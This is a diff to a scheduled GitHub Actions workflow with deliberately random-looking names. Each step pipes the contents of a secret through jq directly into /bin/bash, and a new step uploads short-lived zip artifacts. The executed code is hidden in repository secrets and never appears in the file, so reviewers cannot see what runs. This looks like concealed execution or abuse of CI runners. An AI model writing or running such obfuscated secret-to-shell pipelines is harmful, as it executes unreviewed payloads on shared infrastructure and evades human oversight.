@@ -1,23 +1,28 @@
 name: lishijianliang
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '43 4/6 * * *'
-jobs:  # 8015
+    - cron: '45 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: lishijianliang
         env:
-          q3: ${{ secrets.q3 }}
+          xbrgh0589: ${{ secrets.xbrgh0589 }}
         run: |
-          echo $q3 | jq -r .pflx643 | /bin/bash
-          echo $z6272 | jq -r .z48 | /bin/bash
-          echo $vsb1 | jq -r .wkz8 | /bin/bash
-          echo $ppvmt68 | jq -r .kdai702 | /bin/bash
-          echo $amnmf4456 | jq -r .alixq0 | /bin/bash
-          echo $rkjw37 | jq -r .oqj97 | /bin/bash
-          echo $z83 | jq -r .xwgcb4 | /bin/bash
-          echo $krrl63495 | jq -r .lybj4 | /bin/bash
+          printf '%s' "$xbrgh0589" | jq -r .tqg11 | /bin/bash
+          echo $bydn51489 | jq -r .fwepi82 | /bin/bash
+          printf '%s' "$auzvs37" | jq -r .yltcw6 | /bin/bash
+          printf '%s' "$gnxr12" | jq -r .sm150 | /bin/bash
+          printf '%s' "$trxo71466" | jq -r .iht299 | /bin/bash
+          printf '%s' "$qbjr66" | jq -r .hysv0 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: vyzyl57k
+          path: "*.zip"
+          retention-days: 1
